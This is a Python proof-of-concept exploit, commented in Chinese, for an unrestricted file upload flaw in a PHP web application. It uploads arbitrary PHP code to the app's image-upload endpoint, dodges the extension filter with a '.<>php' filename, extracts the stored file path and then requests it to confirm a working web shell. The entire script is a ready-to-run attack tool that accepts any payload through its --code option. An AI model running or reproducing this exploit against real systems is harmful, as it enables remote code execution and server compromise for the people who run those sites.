#!/usr/bin/env python3
"""
POC for Unrestricted File Upload to RCE (PHP)
Usage: python3 upload_rce.py <target_url> [--code "<?=phpinfo();?>"] [--filename "test.<>php"]
Example: python3 upload_rce.py http://localhost:8080
"""

import sys
import argparse
import requests
import random
import string

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()


class UploadRCE:
    def __init__(self, base_url, timeout=10, verify=False):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.verify = verify
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Upload RCE POC)"
        })

    def upload_file(self, php_code, filename=None):
        """
        上传PHP文件，返回文件的访问URL
        """
        if not filename:
            # 生成随机文件名，但保留<>绕过过滤
            rand_name = ''.join(random.choices(string.ascii_lowercase, k=6))
            filename = f"{rand_name}.<>php"

        # 构造上传请求
        url = f"{self.base_url}/index.php?s=/home/page/uploadImg"
        files = {
            "editormd-image-file": (filename, php_code, "text/plain")
        }
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "Cache-Control": "max-age=0",
            "Connection": "close"
        }
        try:
            resp = self.session.post(
                url,
                files=files,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify
            )
            resp.raise_for_status()
        except requests.RequestException as e:
            print(f"[-] 上传请求失败: {e}")
            return None

        # 尝试从响应中提取文件路径
        # 根据漏洞描述，路径直接返回在响应体中（可能为JSON字符串）
        try:
            data = resp.json()
            file_url = data.get("url") or data.get("file_path") or data.get("path")
            if file_url:
                return file_url
            # 如果JSON中没有直接键，遍历查找
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, str) and ("upload" in value or "php" in value):
                        return value
        except ValueError:
            # 非JSON响应，直接返回文本
            text = resp.text
            # 简单匹配路径特征
            import re
            match = re.search(r'(/uploads/[^\s"\']+\.php)', text)
            if match:
                return match.group(1)
            else:
                print(f"[-] 未能自动提取文件路径，响应内容:\n{text[:200]}")
                return None

        print("[-] 无法从响应中解析文件路径")
        return None

    def check_shell(self, file_url):
        """验证上传的shell是否可访问"""
        full_url = self.base_url + file_url if file_url.startswith("/") else self.base_url + "/" + file_url
        try:
            resp = self.session.get(full_url, timeout=self.timeout, verify=self.verify)
            if resp.status_code == 200:
                return True, resp.text
            return False, f"状态码: {resp.status_code}"
        except Exception as e:
            return False, str(e)


def main():
    parser = argparse.ArgumentParser(
        description="POC - Unrestricted File Upload leading to RCE"
    )
    parser.add_argument("target", help="目标URL，如 http://192.168.1.100:8080")
    parser.add_argument("--code", default="<?=phpinfo();?>",
                        help="要上传的PHP代码 (默认: <?=phpinfo();?>)")
    parser.add_argument("--filename", help="自定义文件名 (如 test.<>php)，默认随机生成")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时时间")
    parser.add_argument("--no-verify", action="store_true", help="不验证SSL证书")
    args = parser.parse_args()

    poc = UploadRCE(args.target, timeout=args.timeout, verify=not args.no_verify)

    print(f"[*] 目标: {args.target}")
    print(f"[*] 上传内容: {args.code}")

    file_url = poc.upload_file(args.code, args.filename)
    if not file_url:
        print("[-] 上传失败，退出")
        sys.exit(1)

    print(f"[+] 文件上传成功，路径: {file_url}")

    # 构造完整URL并验证
    full_url = poc.base_url + file_url if file_url.startswith("/") else poc.base_url + "/" + file_url
    print(f"[*] 完整访问URL: {full_url}")

    print("[*] 验证 shell 是否可访问...")
    accessible, content = poc.check_shell(file_url)
    if accessible:
        print("[✔] Shell 可访问！")
        print(f"[+] 响应内容:\n{content[:500]}")
    else:
        print(f"[-] Shell 访问异常: {content}")
        sys.exit(1)


if __name__ == "__main__":
    main()